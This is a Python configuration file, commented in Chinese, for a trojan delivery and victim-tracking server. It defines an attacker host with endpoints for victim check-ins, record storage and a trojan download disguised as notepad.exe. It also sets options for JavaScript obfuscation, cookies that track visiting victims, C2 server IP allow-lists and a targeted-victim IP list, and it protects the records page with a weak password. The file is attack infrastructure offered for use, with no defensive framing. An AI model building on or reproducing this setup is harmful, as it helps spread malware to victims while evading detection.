#! user/bin/env python3
# coding: utf-8

# 版本号记录
VERSION = "20220721 16:40 0.0.2"
"""
更新记录:
20220721 12:00 初步实现外网IP和Cookie字段、跳江判断上线
20220721 16:40 增加权限限制功能,木马下载限制、记录存储限制、记录访问限制
"""
# 设置访问上线页面的密码
pwd = "12345"

# 记录上线结果文件名称
record_name = "record.txt"

# 设置JS中访问的IP:Port或域名
PROTOCOL = "http"
DOMAIN = "192.168.88.143"
QUERY = f"{PROTOCOL}://{DOMAIN}/exist"
STORE = f"{PROTOCOL}://{DOMAIN}/store"
DOWNLOAD = f"{PROTOCOL}://{DOMAIN}/download/notepad.exe"

replace_list = [PROTOCOL, DOMAIN, QUERY, STORE, DOWNLOAD]

# 定义默认值, 防止写入和提取时各变量单词有误
ONLINE_TIME = "online_time"
ACTION = "action"
USER_NAME = "userName"
COMPUTER_NAME = "computerName"
EXTERNAL_IP = "externalIP"
INTERNAL_IP = "internalIP"

# 混淆JS文件
# js_obfuscate_method == 0: 不加密
# js_obfuscate_method == 1: js_obfuscate_m1(js_code_dir=static_path)  # 存在警告信息,启动时间长
# js_obfuscate_method == 2: js_obfuscate_m2(js_code_dir=static_path)  # 存在弹框时中文乱码信息
js_obfuscate_method = 0

# 在线JS混淆  https://obfuscator.io/ 可行 || http://jshaman.com/ 可行 || http://www.jsfuck.com/ 部分可行

# Cookie变量名
# Cookie记录的默认值
DEFAULT_VALUE = 1
# Cookie有效期 # max_age设置有效期，单位：秒
MAX_AGE = 60 * 60 * 24 * 7
# 访问IP是否上线页面的cookie标记
ACCESSED_IP_EXIST_PAGE = "accessed_ip_exist_page"
# 访问木马下载页面的cookie标记
ACCESSED_DOWNLOAD_PAGE = "accessed_download_page"
ACCESSED_DOWNLOAD_FILE = "accessed_download_file"
# 访问上线记录页面的cookie标记
ACCESSED_ONLINE_PAGE = "accessed-online-page"

# 攻击者的服务器IP列表 # 只接受这个IP列表里发过来的上线记录数据,  # 为空时不检验IP数据
# 以下都是使用字符串匹配, 需求【192.168.0.0/16】可模糊写为【192.168】
ATTACK_C2_SERVER_IP_LIST = []

# 只接受这个IP列表内的IP访问上线记录数据
ATTACK_CALL_SERVER_IP_LIST = []

# 针对性攻击端IP列表 # 只接受这个IP列表里的外网IP下载木马文件 # 为空时不检验IP数据
VICTIM_SERVER_IP_LIST = []

# 手动设置不同上线情况的返回值 # 上线概率优化-可根据网络IP段判断该IP是否时局域网的其他IP
HAS_IP_HAS_COOKIE = "TRUE"  # 存在IP上线记录、并且存在Cookie访问记录,
HAS_CIP_HAS_COOKIE = "TRUE"  # 存在CIP上线记录、并且存在Cookie访问记录,

HAS_IP_NOT_COOKIE = "TRUE"  # 存在IP上线记录、但不存在Cookie访问记录, # 动态判断
HAS_CIP_NOT_COOKIE = "TRUE"  # 存在CIP上线记录、但不存在Cookie访问记录, # 动态判断

NOT_IP_HAS_COOKIE = "FALSE"  # 不存在IP上线记录、但存在Cookie访问记录 # 动态判断
NOT_CIP_HAS_COOKIE = "FALSE"  # 不存在CIP上线记录、但存在Cookie访问记录 # 动态判断

NOT_IP_NOT_COOKIE = "FALSE"  # 不存在IP上线记录、也不存在Cookie访问记录
NOT_CIP_NOT_COOKIE = "FALSE"  # 不存在CIP上线记录、也不存在Cookie访问记录
